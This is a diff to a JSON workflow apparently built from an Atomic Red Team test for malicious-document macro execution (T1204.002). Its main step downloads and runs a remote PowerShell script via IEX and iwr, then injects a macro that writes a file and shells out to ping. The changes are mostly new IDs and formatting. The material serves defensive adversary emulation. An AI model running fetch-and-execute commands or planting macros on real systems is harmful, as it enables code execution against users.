@@ -7,87 +7,87 @@
   ],
   "steps": [
     {
-      "id": "ba3b5a9d-4062-426d-9ec0-df54b272ae7d",
+      "id": "2dca68e6-f3b5-4b31-930c-b420818dc289",
       "type": "execute-command",
       "data": {
-        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"ping 8.8.8.8`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"ping 8.8.8.8`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "3fc78859-c2cb-41f4-ab94-72b16e871d1c",
+      "id": "4ad8df9c-8fa4-46ce-b767-7ed604d2bd5c",
       "type": "execute-command",
       "data": {
-        "command": "Remove-Item #{jse_path} -ErrorAction Ignore\n",
+        "command": "Remove-Item #{jse_path} -ErrorAction Ignore",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "a0516ac4-169b-432d-a2df-6bf14347d290",
+      "id": "8f43672d-6def-4fd8-8575-8121628cfb87",
       "name": "Check dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
       "data": {
-        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
-        "command_type": ""
+        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }",
+        "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "cfabc707-35fb-4b05-ba15-d32de9479f4e",
+      "id": "a9d5243f-e1ec-4dc7-b44f-c84d895171e0",
       "name": "Resolve dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
       "data": {
-        "command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n",
-        "command_type": ""
+        "command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"",
+        "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "82cc8749-b780-408c-8e87-5a064ecb259d",
+      "id": "da787426-daf9-4725-9012-150ffb2dc663",
       "name": "Re-check dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
       "data": {
-        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
-        "command_type": ""
+        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }",
+        "command_type": "powershell"
       },
       "elevation_required": false
     }
   ],
   "flows": [
     {
-      "s": "ba3b5a9d-4062-426d-9ec0-df54b272ae7d",
+      "s": "2dca68e6-f3b5-4b31-930c-b420818dc289",
       "p": "on-success",
-      "o": "3fc78859-c2cb-41f4-ab94-72b16e871d1c"
+      "o": "4ad8df9c-8fa4-46ce-b767-7ed604d2bd5c"
     },
     {
-      "s": "ba3b5a9d-4062-426d-9ec0-df54b272ae7d",
+      "s": "2dca68e6-f3b5-4b31-930c-b420818dc289",
       "p": "on-failure",
-      "o": "3fc78859-c2cb-41f4-ab94-72b16e871d1c"
+      "o": "4ad8df9c-8fa4-46ce-b767-7ed604d2bd5c"
     },
     {
-      "s": "a0516ac4-169b-432d-a2df-6bf14347d290",
+      "s": "8f43672d-6def-4fd8-8575-8121628cfb87",
       "p": "on-success",
-      "o": "ba3b5a9d-4062-426d-9ec0-df54b272ae7d"
+      "o": "2dca68e6-f3b5-4b31-930c-b420818dc289"
     },
     {
-      "s": "a0516ac4-169b-432d-a2df-6bf14347d290",
+      "s": "8f43672d-6def-4fd8-8575-8121628cfb87",
       "p": "on-failure",
-      "o": "cfabc707-35fb-4b05-ba15-d32de9479f4e"
+      "o": "a9d5243f-e1ec-4dc7-b44f-c84d895171e0"
     },
     {
-      "s": "cfabc707-35fb-4b05-ba15-d32de9479f4e",
+      "s": "a9d5243f-e1ec-4dc7-b44f-c84d895171e0",
       "p": "on-success",
-      "o": "82cc8749-b780-408c-8e87-5a064ecb259d"
+      "o": "da787426-daf9-4725-9012-150ffb2dc663"
     },
     {
-      "s": "82cc8749-b780-408c-8e87-5a064ecb259d",
+      "s": "da787426-daf9-4725-9012-150ffb2dc663",
       "p": "on-failure",
-      "o": "ba3b5a9d-4062-426d-9ec0-df54b272ae7d"
+      "o": "2dca68e6-f3b5-4b31-930c-b420818dc289"
     }
   ],
   "tags": [
